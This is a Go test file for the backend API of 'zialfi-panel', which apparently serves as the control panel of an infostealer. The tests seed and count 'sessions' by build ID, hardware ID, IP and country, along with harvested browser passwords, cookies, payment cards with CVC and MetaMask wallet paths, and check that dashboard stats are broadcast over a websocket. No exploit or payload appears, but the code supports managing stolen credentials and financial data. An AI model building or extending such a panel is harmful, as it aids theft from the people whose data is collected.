package api_test

import (
	"database/sql"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/gorilla/websocket"
	"zialfi-panel/internal/api"
	"zialfi-panel/internal/db"
	"zialfi-panel/internal/auth"
	"zialfi-panel/internal/ws"
)

func setupTestRouter(t *testing.T, d *sql.DB, hub *ws.Hub) (chi.Router, string) {
	t.Helper()
	jwtSecret := "test-secret"
	r := chi.NewRouter()

	userID := createTestUser(t, d, "testuser", "testpass")

	api.SetupRoutes(r, d, jwtSecret, "*", hub, nil, nil, db.ProviderSQLite)

	token, _, err := auth.GenerateToken(userID, "admin", jwtSecret, "")
	if err != nil {
		t.Fatal(err)
	}

	return r, token
}

func TestStats_Empty(t *testing.T) {
	d := openTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	req := httptest.NewRequest(http.MethodGet, "/api/stats", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	sessions := resp["sessions"].(map[string]any)
	if sessions["total"].(float64) != 0 {
		t.Errorf("expected sessions.total=0, got %v", sessions["total"])
	}
	if sessions["today"].(float64) != 0 {
		t.Errorf("expected sessions.today=0, got %v", sessions["today"])
	}
	if resp["passwords"].(map[string]any)["total"].(float64) != 0 {
		t.Errorf("expected passwords.total=0")
	}
	if resp["cookies"].(map[string]any)["total"].(float64) != 0 {
		t.Errorf("expected cookies.total=0")
	}
	if resp["cards"].(map[string]any)["total"].(float64) != 0 {
		t.Errorf("expected cards.total=0")
	}
	if resp["wallets"].(map[string]any)["total"].(float64) != 0 {
		t.Errorf("expected wallets.total=0")
	}

	geo := resp["geo"].([]any)
	if len(geo) != 0 {
		t.Errorf("expected empty geo, got %v", geo)
	}
	browsers := resp["browsers"].([]any)
	if len(browsers) != 0 {
		t.Errorf("expected empty browsers, got %v", browsers)
	}
	timeline := resp["timeline"].([]any)
	if len(timeline) != 0 {
		t.Errorf("expected empty timeline, got %v", timeline)
	}
	topDomains := resp["top_domains"].([]any)
	if len(topDomains) != 0 {
		t.Errorf("expected empty top_domains, got %v", topDomains)
	}
}

func TestStats_WithData(t *testing.T) {
	d := openTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES ('s1', 'b1', 'hw1', 'win10', 'user1', '1.2.3.4', 'US', datetime('now', '-1 day'))`)
	if err != nil {
		t.Fatal(err)
	}
	_, err = d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES ('s2', 'b1', 'hw2', 'win11', 'user2', '5.6.7.8', 'GB', datetime('now'))`)
	if err != nil {
		t.Fatal(err)
	}
	_, err = d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES ('s3', 'b1', 'hw3', 'macos', 'user3', '9.10.11.12', '', datetime('now'))`)
	if err != nil {
		t.Fatal(err)
	}

	_, err = d.Exec(`INSERT INTO passwords (id, session_id, url, username, password_value, browser)
		VALUES ('p1', 's1', 'https://example.com', 'u1', 'pass1', 'chrome')`)
	if err != nil {
		t.Fatal(err)
	}
	_, err = d.Exec(`INSERT INTO passwords (id, session_id, url, username, password_value, browser)
		VALUES ('p2', 's1', 'https://google.com', 'u2', 'pass2', 'chrome')`)
	if err != nil {
		t.Fatal(err)
	}
	_, err = d.Exec(`INSERT INTO passwords (id, session_id, url, username, password_value, browser)
		VALUES ('p3', 's2', 'https://example.com', 'u3', 'pass3', 'firefox')`)
	if err != nil {
		t.Fatal(err)
	}

	_, err = d.Exec(`INSERT INTO cookies (id, session_id, domain, name, value, path)
		VALUES ('c1', 's1', 'example.com', 'session', 'abc', '/')`)
	if err != nil {
		t.Fatal(err)
	}

	_, err = d.Exec(`INSERT INTO cards (id, session_id, number, exp_month, exp_year, holder, cvc)
		VALUES ('cc1', 's1', '4111', '12', '28', 'John', '123')`)
	if err != nil {
		t.Fatal(err)
	}

	_, err = d.Exec(`INSERT INTO wallets (id, session_id, name, path)
		VALUES ('w1', 's1', 'MetaMask', '/path/to/wallet')`)
	if err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/stats", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	sessions := resp["sessions"].(map[string]any)
	if sessions["total"].(float64) != 3 {
		t.Errorf("expected 3 sessions total, got %v", sessions["total"])
	}
	if sessions["today"].(float64) != 2 {
		t.Errorf("expected 2 sessions today, got %v", sessions["today"])
	}

	passwords := resp["passwords"].(map[string]any)
	if passwords["total"].(float64) != 3 {
		t.Errorf("expected 3 passwords, got %v", passwords["total"])
	}

	cookies := resp["cookies"].(map[string]any)
	if cookies["total"].(float64) != 1 {
		t.Errorf("expected 1 cookie, got %v", cookies["total"])
	}

	cards := resp["cards"].(map[string]any)
	if cards["total"].(float64) != 1 {
		t.Errorf("expected 1 card, got %v", cards["total"])
	}

	wallets := resp["wallets"].(map[string]any)
	if wallets["total"].(float64) != 1 {
		t.Errorf("expected 1 wallet, got %v", wallets["total"])
	}

	geo := resp["geo"].([]any)
	if len(geo) != 2 {
		t.Fatalf("expected 2 geo entries, got %d: %v", len(geo), geo)
	}
	geoMap := make(map[string]float64)
	for _, g := range geo {
		entry := g.(map[string]any)
		geoMap[entry["country_code"].(string)] = entry["count"].(float64)
	}
	if geoMap["US"] != 1 {
		t.Errorf("expected US count=1, got %v", geoMap["US"])
	}
	if geoMap["GB"] != 1 {
		t.Errorf("expected GB count=1, got %v", geoMap["GB"])
	}

	browsers := resp["browsers"].([]any)
	if len(browsers) != 2 {
		t.Fatalf("expected 2 browser entries, got %d: %v", len(browsers), browsers)
	}

	timeline := resp["timeline"].([]any)
	if len(timeline) == 0 {
		t.Error("expected non-empty timeline")
	}

	topDomains := resp["top_domains"].([]any)
	if len(topDomains) == 0 {
		t.Error("expected non-empty top_domains, got empty")
	}
}

func TestStats_RequiresAuth(t *testing.T) {
	d := openTestDB(t)
	r, _ := setupTestRouter(t, d, nil)

	req := httptest.NewRequest(http.MethodGet, "/api/stats", nil)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Fatalf("expected 401, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]string
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	if resp["error"] == "" {
		t.Error("expected error message")
	}
}

func TestStats_BroadcastsViaHub(t *testing.T) {
	d := openTestDB(t)
	hub := ws.NewHub()
	go hub.Run()

	jwtSecret := "test-secret"
	userID := createTestUser(t, d, "broadcastuser", "testpass")
	token, _, err := auth.GenerateToken(userID, "admin", jwtSecret, "")
	if err != nil {
		t.Fatal(err)
	}

	r := chi.NewRouter()
	r.Get("/ws", ws.ServeWs(hub, jwtSecret, "*"))
	r.Group(func(r chi.Router) {
		r.Use(api.AuthMiddleware(jwtSecret))
		statsHandler := api.NewStatsHandler(d, hub, db.ProviderSQLite)
		r.Get("/api/stats", statsHandler.Dashboard)
	})

	srv := httptest.NewServer(r)
	defer srv.Close()

	dialer := &websocket.Dialer{HandshakeTimeout: 45 * time.Second}
	wsURL := "ws" + strings.TrimPrefix(srv.URL, "http") + "/ws"
	conn, _, err := dialer.Dial(wsURL, http.Header{"Origin": {"http://test"}})
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	err = conn.WriteJSON(map[string]string{"type": "auth", "token": token})
	if err != nil {
		t.Fatal(err)
	}
	time.Sleep(50 * time.Millisecond)

	req, err := http.NewRequest(http.MethodGet, srv.URL+"/api/stats", nil)
	if err != nil {
		t.Fatal(err)
	}
	req.Header.Set("Authorization", "Bearer "+token)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("expected 200, got %d", resp.StatusCode)
	}

	conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	_, msg, err := conn.ReadMessage()
	if err != nil {
		t.Fatalf("expected broadcast message: %v", err)
	}

	var ev struct {
		Type string `json:"type"`
	}
	if err := json.Unmarshal(msg, &ev); err != nil {
		t.Fatal(err)
	}
	if ev.Type != "stats_update" {
		t.Errorf("expected type 'stats_update', got %q", ev.Type)
	}
}
